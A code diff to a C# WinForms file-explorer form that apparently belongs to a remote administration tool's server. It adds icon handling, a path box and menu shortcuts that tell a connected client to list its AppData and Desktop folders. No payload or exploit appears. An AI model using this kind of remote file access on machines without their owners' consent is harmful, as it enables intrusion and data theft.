@@ -21,32 +21,41 @@ namespace MLManagementServer.Forms
         string CurrentDirectory = string.Empty;
         Dictionary<Guid, FileBucketInfo> BucketHandler = new Dictionary<Guid, FileBucketInfo>();
         formFileProperties FilePropertyForm = null;
+        ImageList images = new ImageList();
+        IServerUIHandler UIHost;
+        bool customIcons = true;
         public FileExplorerForm(IServerUIHandler UIHandler, IClient c)
         {
             Client = c;
+            UIHost = UIHandler;
             InitializeComponent();
-            ImageList images = new ImageList();
+            
             Image uiFolder = UIHandler.GetImage("folder.png");
+            Image uiFolder2 = UIHandler.GetImage("folder2.png");
             Image uiFile = UIHandler.GetImage("file.png");
             Image uiDrive = UIHandler.GetImage("drive.png");
             Image uiError = UIHandler.GetImage("error.png");
 
             if(uiFolder != null)
                 images.Images.Add("Folder", uiFolder);
-            if(uiFile!=null)
+            if (uiFolder2 != null)
+                images.Images.Add("Folder2", uiFolder2);
+            if (uiFile!=null)
                 images.Images.Add("File", uiFile);
             if(uiDrive!=null)
                 images.Images.Add("Drive", uiDrive);
             if(uiError != null)
                 images.Images.Add("Error", uiError);
+
             lvFileView.SmallImageList = images;
             lvFileBucket.SmallImageList = images;
             c.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, string.Empty);
         }
 
 
-        public void BeginUpdate(bool addUpDir)
+        public void BeginUpdate(bool addUpDir, string currentdir)
         {
+            CurrentDirectory = currentdir;
             Invoke((MethodInvoker)delegate ()
             {
                 lvFileView.View = View.Details;
@@ -57,10 +66,18 @@ namespace MLManagementServer.Forms
                     i.Tag = true;
                     i.ImageKey = "Folder";
                     AddItem(i);
+                    SetDir(currentdir);
                 }
             });
         }
 
+        void SetDir(string dir)
+        {
+            Invoke((MethodInvoker)delegate ()
+            {
+                tbPath.Text = dir;
+            });
+        }
 
         public void InvalidDirectory(string message)
         {
@@ -90,11 +107,41 @@ namespace MLManagementServer.Forms
             i.SubItems.Add(size);
             AddItem(i);
         }
-        public void AddToList(string name, string size, string key)
+
+        public void AddDirectory(string name, bool empty)
         {
             ListViewItem i = new ListViewItem(name);
             i.Tag = false;
-            i.ImageKey = key;
+            i.ImageKey = "Folder";
+            if(!empty)
+            {
+                if (images.Images.ContainsKey("Folder2"))
+                {
+                    i.ImageKey = "Folder2";
+                }
+            }
+            AddItem(i);
+        }
+        public void AddFile(string name, string size)
+        {
+            ListViewItem i = new ListViewItem(name);
+            i.Tag = false;
+            i.ImageKey = "File";
+            string fullExt = Path.GetExtension(name).ToLower();
+            string extention = fullExt.Substring(1, fullExt.Length - 1);
+            if (!images.Images.ContainsKey(extention))
+            {
+                Image extImage = UIHost.GetImage(string.Format("FileExtention/file_extension_{0}.png", extention));
+                if (extImage != null)
+                {
+                    images.Images.Add(extention, extImage);
+                    i.ImageKey = extention;
+                }
+            }
+            else
+            {
+                i.ImageKey = extention;
+            }
             i.SubItems.Add(size);
             AddItem(i);
         }
@@ -438,7 +485,6 @@ namespace MLManagementServer.Forms
                 FilePropertyForm.FormClosed += FilePropertyForm_FormClosed;
                 Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.GetFileProperties, id, rPath);
                 FilePropertyForm.ShowDialog();
-                
             }
             
         }
@@ -448,5 +494,33 @@ namespace MLManagementServer.Forms
             formFileProperties f = (formFileProperties)sender;
             f.Dispose();
         }
+
+        private void apptadaToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileView.View == View.List)
+                return;
+            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.UpdateToSpecialFolder, (int)(Environment.SpecialFolder.ApplicationData));
+        }
+
+        private void rootdriveListToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, string.Empty);
+        }
+
+        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.UpdateToSpecialFolder, (int)(Environment.SpecialFolder.Desktop));
+        }
+
+        private void showCustomIconsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            customIcons = showCustomIconsToolStripMenuItem.Checked;
+        }
+
+        private void splitContainer1_Panel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
     }
+    
 }
